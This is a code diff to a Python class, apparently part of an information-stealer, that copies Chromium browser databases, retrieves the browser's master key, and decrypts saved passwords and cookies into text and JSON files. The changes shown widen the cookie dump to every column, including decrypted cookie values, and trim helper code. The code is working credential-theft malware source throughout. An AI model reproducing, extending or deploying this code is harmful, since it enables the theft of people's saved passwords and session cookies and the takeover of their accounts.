@@ -27,13 +27,6 @@ class Chromium:
         if any(paths) and any(self.statuses):
             mkdir(rf"{self.storage_path}\{self.storage_folder}\{self.browser_name}")
 
-    def __get_datetime(self, date):
-
-        try:
-            return str(datetime(1601, 1, 1) + timedelta(microseconds=date))
-        except:
-            return "Can't decode"
-
     def __get_key(self):
 
         with open(self.state_path, "r", encoding="utf-8") as state:
@@ -48,7 +41,7 @@ class Chromium:
 
     def __write_passwords(self, cursor, master_key):
 
-        with open(rf"{self.storage_path}\{self.storage_folder}\{ self.browser_name}\Passwords.txt", "a", encoding="utf-8") as passwords:
+        with open(rf"{self.storage_path}\{self.storage_folder}\{self.browser_name}\Passwords.txt", "a", encoding="utf-8") as passwords:
             for result in cursor.execute(self.config.PasswordsSQL).fetchall():
 
                 password = self.__decrypt(result[2], master_key)
@@ -63,21 +56,26 @@ class Chromium:
         results = []
 
         for result in cursor.execute(self.config.CookiesSQL).fetchall():
-
-            if not result[2]:
-                decrypted_value = self.__decrypt(result[6], master_key)
-            else:
-                decrypted_value = result[2]
-
-            if any([bool(item) for item in result] + [bool(decrypted_value)]):
-                results.append({
-                    "host": result[0],
-                    "name": result[1],
-                    "value": decrypted_value,
-                    "creation_datetime": self.__get_datetime(result[3]),
-                    "last_access_datetime": self.__get_datetime(result[4]),
-                    "expires_datetime": self.__get_datetime(result[5])
-                })
+            results.append({
+                "creation_utc": result[0],
+                "top_frame_site_key": result[1],
+                "host_key": result[2],
+                "name": result[3],
+                "value": result[4],
+                "encrypted_value": self.__decrypt(result[5], master_key),
+                "path": result[6],
+                "expires_utc": result[7],
+                "is_secure": result[8],
+                "is_httponly": result[9],
+                "last_access_utc": result[10],
+                "has_expires": result[11],
+                "is_persistent": result[12],
+                "priority": result[13],
+                "samesite": result[14],
+                "source_scheme": result[15],
+                "source_port": result[16],
+                "is_same_party": result[17],
+            })
 
         with open(rf"{self.storage_path}\{self.storage_folder}\{self.browser_name}\Cookies.json", "a", encoding="utf-8") as cookies:
 
@@ -132,10 +130,10 @@ class Chromium:
 
                 if item["status"] is True:
 
-                    if (path.exists(item["path"])) is True:
+                    if path.exists(item["path"]) is True:
                         copyfile(item["path"], rf'{self.storage_path}\{self.browser_name} {item["name"]}.db')
 
-                    elif item["alt_path"] is not None and (path.exists(item["alt_path"])):
+                    elif item["alt_path"] is not None and path.exists(item["alt_path"]):
                         copyfile(item["alt_path"], rf'{self.storage_path}\{self.browser_name} {item["name"]}.db')
 
                     else:
@@ -145,9 +143,8 @@ class Chromium:
 
                     with connect(rf'{self.storage_path}\{self.browser_name} {item["name"]}.db') as connection:
                         connection.text_factory = lambda text: text.decode(errors="ignore")
-                        cursor = connection.cursor()
-                        item["method"](cursor, self.__get_key())
-                        cursor.close()
+                        item["method"](connection.cursor(), self.__get_key())
+                        connection.cursor().close()
 
                     connection.close()
                     remove(rf'{self.storage_path}\{self.browser_name} {item["name"]}.db')
